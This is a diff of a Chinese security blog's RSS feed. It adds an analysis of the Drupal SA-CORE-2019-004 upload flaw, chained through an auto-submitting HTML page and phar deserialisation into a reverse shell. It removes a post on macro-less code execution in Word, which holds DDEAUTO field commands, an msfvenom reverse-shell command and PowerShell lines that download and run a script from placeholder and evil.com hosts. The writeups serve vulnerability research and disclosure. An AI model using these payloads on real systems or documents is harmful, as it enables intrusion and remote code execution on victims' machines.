@@ -10,6 +10,193 @@
     <atom:link href="https://kylingit.com/tags/vul/index.xml" rel="self" type="application/rss+xml" />
     
     <item>
+      <title>SA-CORE-2019-004 Drupal内核从XSS到RCE漏洞分析</title>
+      <link>https://kylingit.com/blog/sa-core-2019-004-drupal%E5%86%85%E6%A0%B8%E4%BB%8Exss%E5%88%B0rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</link>
+      <pubDate>Mon, 22 Apr 2019 15:19:04 +0000</pubDate>
+      
+      <guid>https://kylingit.com/blog/sa-core-2019-004-drupal%E5%86%85%E6%A0%B8%E4%BB%8Exss%E5%88%B0rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</guid>
+      <description>
+
+&lt;script src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/pangu.js&#34;&gt;&lt;/script&gt;
+
+&lt;h3 id=&#34;0x01-概述&#34;&gt;0x01 概述&lt;/h3&gt;
+
+&lt;p&gt;3月20日，Drupal官方发布SA-CORE-2019-004漏洞预警，修复了一处处理文件名异常，官方描述为中危，因为该漏洞需要作者权限来上传文件&lt;/p&gt;
+
+&lt;p&gt;详细参考：&lt;a href=&#34;https://www.drupal.org/sa-core-2019-004&#34;&gt;https://www.drupal.org/sa-core-2019-004&lt;/a&gt;&lt;/p&gt;
+
+&lt;h3 id=&#34;0x02-漏洞分析&#34;&gt;0x02 漏洞分析&lt;/h3&gt;
+
+&lt;p&gt;根据官方&lt;a href=&#34;https://github.com/drupal/core/commit/933f4f9d620af5807c4eb4ec17dc4eb4193a667c&#34;&gt;补丁&lt;/a&gt;，最主要修改了一处&lt;code&gt;preg_replace&lt;/code&gt;异常，修改的方法为&lt;code&gt;file.inc:file_create_filename()&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190422165341.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;该方法的主要功能是将返回上传文件的路径，返回形如&lt;code&gt;public://2019-04/1.png&lt;/code&gt;的路径，然后由&lt;code&gt;drupal&lt;/code&gt;自身实现的方法将&lt;code&gt;public://&lt;/code&gt;路径转换为相对路径。问题出在这行处理&lt;code&gt;utf-8&lt;/code&gt;编码的代码上&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;$basename = preg_replace(&#39;/[\x00-\x1F]/u&#39;, &#39;_&#39;, $basename);&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;这行代码的意思的如果文件名中含有&lt;code&gt;0x00-0x1F&lt;/code&gt;区间的字符时，将其转换为&lt;code&gt;_&lt;/code&gt;。查看标准&lt;code&gt;ASCII&lt;/code&gt;码表，字符所对应的十进制数范围为&lt;code&gt;0-127&lt;/code&gt;，&lt;code&gt;0x00-0x1F&lt;/code&gt;对应的数为&lt;code&gt;0-31&lt;/code&gt;，也就是前32个不常见或者说不可显字符。&lt;strong&gt;假如我们传入的字符范围大于128时，&lt;code&gt;preg_replace&lt;/code&gt;便会出错&lt;/strong&gt;，返回一个&lt;code&gt;NULL&lt;/code&gt;值，于是此时的&lt;code&gt;basename&lt;/code&gt;便被赋值为空，而下面对&lt;code&gt;basename&lt;/code&gt;也没有多余的操作，于是我们就得到了一个没有后缀的文件，而且这个文件的名称也是可以预测的，相关代码如下&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;if (file_exists($destination)) {
+    // Destination file already exists, generate an alternative.
+    $pos = strrpos($basename, &#39;.&#39;);
+    if ($pos !== FALSE) {
+      $name = substr($basename, 0, $pos);
+      $ext = substr($basename, $pos);
+    }
+    else {
+      $name = $basename;
+      $ext = &#39;&#39;;
+    }
+
+    $counter = 0;
+    do {
+      $destination = $directory . $separator . $name . &#39;_&#39; . $counter++ . $ext;
+    } while (file_exists($destination));
+  }
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;在开始有一个&lt;code&gt;file_exists&lt;/code&gt;判断，所以我们需要上传相同文件至少两次，才能进入&lt;code&gt;if&lt;/code&gt;分支。由于&lt;code&gt;$basename&lt;/code&gt;为空，&lt;code&gt;$name&lt;/code&gt;也被赋值为空，接下来进入一个循环，如果文件已经存在，就把文件命名为&lt;code&gt;路径+分隔符+name+_+counter+后缀&lt;/code&gt;的形式，也就是说同名文件会加上后缀&lt;code&gt;_0&lt;/code&gt; &lt;code&gt;_1&lt;/code&gt;等，而此时表达式的值即为&lt;code&gt;下划线+计数器&lt;/code&gt;的值，于是我们在&lt;code&gt;/sites/default/files/pictures/&amp;lt;YYYY-MM&amp;gt;/&lt;/code&gt;目录下得到类似&lt;code&gt;_0 _1&lt;/code&gt;的无后缀文件。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190422171620.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;值得注意的是，上传的文件可以是任意类型，不局限于图片文件，可以通过&lt;code&gt;http://drupal-site/sites/default/files/&amp;lt;YYYY-MM&amp;gt;/_1&lt;/code&gt;访问到文件。&lt;/p&gt;
+
+&lt;h3 id=&#34;0x03-尝试利用&#34;&gt;0x03 尝试利用&lt;/h3&gt;
+
+&lt;h4 id=&#34;初探&#34;&gt;初探&lt;/h4&gt;
+
+&lt;p&gt;此时我们想到，可以上传一个html文件，诱使管理员点击形成一个XSS漏洞。&lt;/p&gt;
+
+&lt;p&gt;但是这里存在一个问题，当通过&lt;code&gt;Home &amp;gt;&amp;gt; Add content &amp;gt;&amp;gt; 上传Image&lt;/code&gt;上传文件时，如果传了一个纯HTML文件，是无法上传成功的，因为在&lt;code&gt;core/modules/file/file.module&lt;/code&gt;里有一个检查&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;$errors = file_validate($file, $validators);&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;file_validate()&lt;/code&gt;方法通过下图4个方法检查图片有效性&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190423111858.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;其中&lt;code&gt;file_validate_is_image&lt;/code&gt;方法使用了&lt;code&gt;ImageFactory&lt;/code&gt;库，非图片文件无法通过这个检查，于是上传失败，也就无法在&lt;code&gt;sites/default/files/&amp;lt;YYYY-MM&amp;gt;/&lt;/code&gt;生成文件。&lt;/p&gt;
+
+&lt;p&gt;当然这里是可以绕过的，那就是在上传的内容前加上图片文件头，例如&lt;code&gt;GIF&lt;/code&gt;或&lt;code&gt;GIF89a&lt;/code&gt;，能够绕过&lt;code&gt;file_validate_is_image&lt;/code&gt;检查上传文件，然而这并没有什么用，因为访问&lt;code&gt;http://drupal-site/sites/default/files/&amp;lt;YYYY-MM&amp;gt;/_1&lt;/code&gt;时，浏览器无法判断文件类型，所以不会解析&amp;hellip;&lt;/p&gt;
+
+&lt;p&gt;也就是说&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;纯HTML文件无后缀，浏览器可以解析，但是无法上传；&lt;/li&gt;
+&lt;li&gt;增加图片文件头，可以上传，但是浏览器不能解析；&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;于是现在陷入一个尴尬境地，需要找个另外的点。&lt;/p&gt;
+
+&lt;h4 id=&#34;突破&#34;&gt;突破&lt;/h4&gt;
+
+&lt;p&gt;我们注意到在&lt;code&gt;新建文章&lt;/code&gt;页面除了上传图片外，还有一个编辑器内置的图片上传接口，这个接口是否可以上传html呢&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190423111342.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;跟入分析一下，之前的流程都是一样的，同样会进入&lt;code&gt;file_validate()&lt;/code&gt;方法，同样检测文件合法性，但是此时的&lt;code&gt;$validators&lt;/code&gt;有所不一样：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190423111805.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;file_validate_is_image&lt;/code&gt;变成了&lt;code&gt;file_validate_image_resolution&lt;/code&gt;，这个方法是检测图片是否符合大小，但是对于非图片文件&amp;hellip;直接忽略了，返回一个空数组&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190423113048.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;方法说明里也说了会忽略非图片文件&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;Non-image files will be ignored.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;于是&lt;code&gt;file_validate()&lt;/code&gt;不报错，校验通过，成功上传文件，目录是&lt;code&gt;sites/default/files/inline-images/&lt;/code&gt;，访问文件成功触发&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190423113606.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;现在可以利用这个漏洞上传一个html文件，攻击面就扩大了许多，简单的可以是一个XSS，复杂的可以是个钓鱼页面(这个漏洞需要作者权限，故可以钓鱼管理员)，再进一步，如何进行命令执行甚至直接反弹一个shell呢？&lt;/p&gt;
+
+&lt;h4 id=&#34;组合拳&#34;&gt;组合拳&lt;/h4&gt;
+
+&lt;p&gt;联想到1月份Drupal官方修复的&lt;a href=&#34;https://www.drupal.org/sa-core-2019-002&#34;&gt;SA-CORE-2019-002&lt;/a&gt;漏洞，文件操作函数处理&lt;code&gt;phar&lt;/code&gt;文件时反序列化形成代码执行漏洞，在此处正好可以用上。phar反序列化风险影响几乎所有文件操作函数，而在Drupal中&lt;code&gt;File system&lt;/code&gt;功能就存在这个缺陷，在设置本地临时文件夹的时候会进行路径检查，相关方法是&lt;code&gt;system_check_directory()&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190423135902.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;在这个方法中存在&lt;code&gt;is_dir()&lt;/code&gt;函数，当&lt;code&gt;is_dir()&lt;/code&gt;函数处理&lt;code&gt;phar:// stream wrapper&lt;/code&gt;时，便会触发反序列化，如果传入一个恶意构造的&lt;code&gt;phar&lt;/code&gt;文件就可以造成代码执行。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190423140328.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;那么现在的思路是，上传一个&lt;code&gt;phar&lt;/code&gt;文件，诱使管理员点击链接把临时文件路径设置为&lt;code&gt;phar://test.phar&lt;/code&gt;触发漏洞反弹shell&lt;/p&gt;
+
+&lt;h3 id=&#34;0x04-漏洞利用&#34;&gt;0x04 漏洞利用&lt;/h3&gt;
+
+&lt;p&gt;通过上述分析，有几个限制需要突破：&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;生成的phar文件不能通过图片上传接口上传，否则会失败；&lt;/li&gt;
+&lt;li&gt;需要写一个html让管理员打开链接自动发送请求来修改临时文件路径；&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;因此漏洞利用分为以下几步：&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;&lt;p&gt;生成一个能反弹shell的phar文件；&lt;/p&gt;
+
+&lt;p&gt;Drupal反序列化的POP链已经比较多了，可以参考&lt;a href=&#34;https://kylingit.com/blog/%E7%94%B1phpggc%E7%90%86%E8%A7%A3php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/&#34;&gt;这里&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;选择&lt;code&gt;GuzzleHttp\Psr7&lt;/code&gt;类，使用&lt;a href=&#34;https://kylingit.com/blog/%E7%94%B1phpggc%E7%90%86%E8%A7%A3php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/&#34;&gt;PHARGGC&lt;/a&gt;直接生成phar文件&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190423143704.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;上传phar文件&lt;/p&gt;
+
+&lt;p&gt;把&lt;code&gt;out.phar&lt;/code&gt;修改为png后缀，通过编辑器的接口上传，获得文件路径&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;http://127.0.0.1/drupal-8.6.5/sites/default/files/inline-images/phar.png&lt;/code&gt;&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;生成一个html文件；&lt;/p&gt;
+
+&lt;p&gt;这个html文件需要让管理员打开链接时自动发送请求来修改临时文件路径，与&lt;code&gt;CSRF&lt;/code&gt;非常相似，所以直接使用&lt;code&gt;burpsuite&lt;/code&gt;抓个包生成&lt;code&gt;CSRF PoC&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190423150512.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;然后我们增加一个自动点击提交表单的操作，省去手动submit&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;script type=&amp;quot;text/javascript&amp;quot;&amp;gt;
+    var a  = document.getElementById(&#39;form1&#39;)
+    a.submit()
+&amp;lt;/script&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;再通过编辑器的接口上传这个html文件，修改文件名的&lt;code&gt;ascii&lt;/code&gt;值大于128。&lt;strong&gt;注意需要上传至少两次&lt;/strong&gt;，以生成&lt;code&gt;_0、_1&lt;/code&gt;文件&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190423153014.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;访问&lt;code&gt;http://drupal-site/sites/default/files/inline-images/_0&lt;/code&gt;时浏览器解析为html并自动提交表单，触发漏洞&lt;/p&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190423153510.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;这里因为反弹shell会把页面卡住，可以增加一个跳转首页，这样可以更隐蔽&lt;/p&gt;
+
+&lt;h3 id=&#34;0x05-总结&#34;&gt;0x05 总结&lt;/h3&gt;
+
+&lt;p&gt;这个漏洞由一个&lt;code&gt;preg_replace()&lt;/code&gt;引起的，没有正确处理异常，导致可以上传“任意”文件，结合phar反序列化漏洞组合成一条漂亮的攻击链，值得学习。&lt;/p&gt;
+
+&lt;p&gt;参考：&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;&lt;a href=&#34;https://github.com/drupal/core/commit/933f4f9d620af5807c4eb4ec17dc4eb4193a667c&#34;&gt;https://github.com/drupal/core/commit/933f4f9d620af5807c4eb4ec17dc4eb4193a667c&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;&lt;a href=&#34;https://www.zerodayinitiative.com/blog/2019/4/11/a-series-of-unfortunate-images-drupal-1-click-to-rce-exploit-chain-detailed&#34;&gt;https://www.zerodayinitiative.com/blog/2019/4/11/a-series-of-unfortunate-images-drupal-1-click-to-rce-exploit-chain-detailed&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;&lt;a href=&#34;https://paper.seebug.org/897/&#34;&gt;https://paper.seebug.org/897/&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;script&gt;pangu.spacingPage();&lt;/script&gt;
+</description>
+    </item>
+    
+    <item>
       <title>SA-CORE-2019-003 Drupal 内核远程代码执行漏洞分析</title>
       <link>https://kylingit.com/blog/sa-core-2019-003-drupal-%E5%86%85%E6%A0%B8%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</link>
       <pubDate>Fri, 22 Feb 2019 22:19:04 +0000</pubDate>
@@ -2937,90 +3124,6 @@ demo
 &lt;p&gt;&lt;a href=&#34;https://evi1cg.me/archives/CVE_2017_11882_exp.html&#34;&gt;https://evi1cg.me/archives/CVE_2017_11882_exp.html&lt;/a&gt;&lt;/p&gt;
 
 &lt;p&gt;&lt;a href=&#34;http://www.freebuf.com/vuls/154462.html&#34;&gt;http://www.freebuf.com/vuls/154462.html&lt;/a&gt;&lt;/p&gt;
-
-&lt;script&gt;pangu.spacingPage();&lt;/script&gt;
-</description>
-    </item>
-    
-    <item>
-      <title>MSWord Code Exec Without Macro</title>
-      <link>https://kylingit.com/blog/msword-code-exec-without-macro/</link>
-      <pubDate>Thu, 12 Oct 2017 12:54:29 +0000</pubDate>
-      
-      <guid>https://kylingit.com/blog/msword-code-exec-without-macro/</guid>
-      <description>&lt;script src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/pangu.js&#34;&gt;&lt;/script&gt;
-
-&lt;p&gt;昨天复现了一个 Microsoft Office Word 的一个执行任意代码的姿势，跟之前爆出的两个CVE (CVE-2017-0199, CVE-2017-8759) 可以组成三板斧，这里简单记录一下&lt;/p&gt;
-
-&lt;p&gt;在不启用宏的情况下执行任意程序，按照复现过程来看这确实像是一个功能而不是 bug，微软也表示不会修复这个“漏洞”。这个功能的本意是为了更方便地在 word 里同步更新其它应用的内容，比如说在一个 word文档里引用了另一个excel表格里的某项内容，通过连接域 (Field) 的方式可以实现在 excel 里更新内容后 word 中同步更新的效果，问题出在这个域的内容可以是一个公式(或者说表达式)，这个公式并不限制内容，于是我们可以这样，&lt;code&gt;ctrl+f9&lt;/code&gt;插入一个域，在&lt;code&gt;{}&lt;/code&gt;之间写入代码：&lt;/p&gt;
-
-&lt;p&gt;&lt;code&gt;{ DDEAUTO c:\\windows\\system32\\cmd.exe &amp;quot;/k calc.exe&amp;quot; }&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;或者&lt;code&gt;插入-文档部件-域&lt;/code&gt;，选择第一个&lt;code&gt;= (Formula)&lt;/code&gt;
-然后右键&lt;code&gt;切换域代码&lt;/code&gt;来编辑代码，插入上面的内容&lt;/p&gt;
-
-&lt;p&gt;这样子可以直接弹出计算器&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/GIF.gif&#34; alt=&#34;calc&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;既然能执行cmd那就能弹shell&lt;/p&gt;
-
-&lt;p&gt;在msf里生成一个ps脚本：&lt;/p&gt;
-
-&lt;p&gt;&lt;code&gt;./msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=1234 -f psh-reflection &amp;gt;xxx.ps1&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;在msf里监听&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/HQ%5D%25%7DB5TLH~HBZD%7B1_%7B$D%254.png&#34; alt=&#34;msf&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;然后开启一个服务器&lt;/p&gt;
-
-&lt;p&gt;&lt;code&gt;python -m SimpleHTTPServer 80&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;远程下载ps脚本后执行&lt;/p&gt;
-
-&lt;p&gt;&lt;code&gt;DDEAUTO c:\\Windows\\System32\\cmd.exe &amp;quot;/k powershell.exe -NoP -sta -NonI -c IEX(New-Object System.Net.WebClient).DownloadString(&#39;http://x.x.x.x/xxx.ps1&#39;);xxx.ps1&amp;quot;&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;打开文件后反弹一个shell&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/MPI@%5B%60%25DL%28U7WZL220E0%5B7Q.jpg&#34; alt=&#34;shell&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;过程很简单，唯一不足的是打开文件过程中会有两次弹窗，第一次是询问是否更新链接，第二个是问是否执行程序，当两个都点击确认后才会执行。&lt;/p&gt;
-
-&lt;p&gt;作者给出的命令是
-&lt;code&gt;{ DDEAUTO c:\\Windows\\System32\\cmd.exe &amp;quot;/k powershell.exe -NoP -sta -NonI -W Hidden $e=(New-Object System.Net.WebClient).DownloadString(&#39;http://evil.com/evil.ps1&#39;);powershell -e $e &amp;quot;}&lt;/code&gt;
-但是自己尝试了并没有成功，于是修改成上面的命令，测试成功，并且不会报毒&lt;/p&gt;
-
-&lt;p&gt;除了上面使用的&lt;code&gt;DDEAUTO&lt;/code&gt;，&lt;code&gt;DDE&lt;/code&gt;也有能实现这个效果，但是要多一个步骤
-将文件后缀改为&lt;code&gt;zip&lt;/code&gt;或&lt;code&gt;rar&lt;/code&gt;，用&lt;code&gt;7z&lt;/code&gt;打开，修改&lt;code&gt;word/settings.xml&lt;/code&gt;文件，增加一行&lt;code&gt;&amp;lt;w:updateFields w:val=&amp;quot;true&amp;quot;/&amp;gt;&lt;/code&gt;
-&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/6U0%25213Q8W%7BEOM%7BJ_V@7%29G7.png&#34; alt=&#34;&#34; /&gt;
-替换原来的&lt;code&gt;xml&lt;/code&gt;文件后把后缀改回来&lt;/p&gt;
-
-&lt;p&gt;编辑文档，域代码为&lt;code&gt;{ DDE &amp;quot;c:\\windows\\system32\\cmd.exe&amp;quot; &amp;quot;/c notepad&amp;quot; }&lt;/code&gt;
-效果跟上面一样&lt;/p&gt;
-
-&lt;p&gt;类似方法除了上面两个外还有&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;GLOSSARY
-IMPORT
-INCLUDE
-SHAPE
-DISPLAYBARCODE
-MERGEBARCODE
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;参考微软文档 &lt;a href=&#34;https://msdn.microsoft.com/en-us/library/ff529384(v=office.12).aspx&#34;&gt;https://msdn.microsoft.com/en-us/library/ff529384(v=office.12).aspx&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;目前不清楚这些方法有没有影响，微软认为并没有必要去修复这个“漏洞”&lt;/p&gt;
-
-&lt;blockquote&gt;
-&lt;p&gt;Microsoft responded that as suggested it is a feature and no further action will be taken, and will be considered for a next-version candidate bug.&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;最近 office 漏洞频发，建议不要打开陌生的文档包括excel，ppt等，如有必要在保护视图中查看，另外及时更新系统补丁&lt;/p&gt;
-
-&lt;p&gt;参考：
-&lt;a href=&#34;https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/&#34;&gt;https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/&lt;/a&gt;&lt;/p&gt;
 
 &lt;script&gt;pangu.spacingPage();&lt;/script&gt;
 </description>
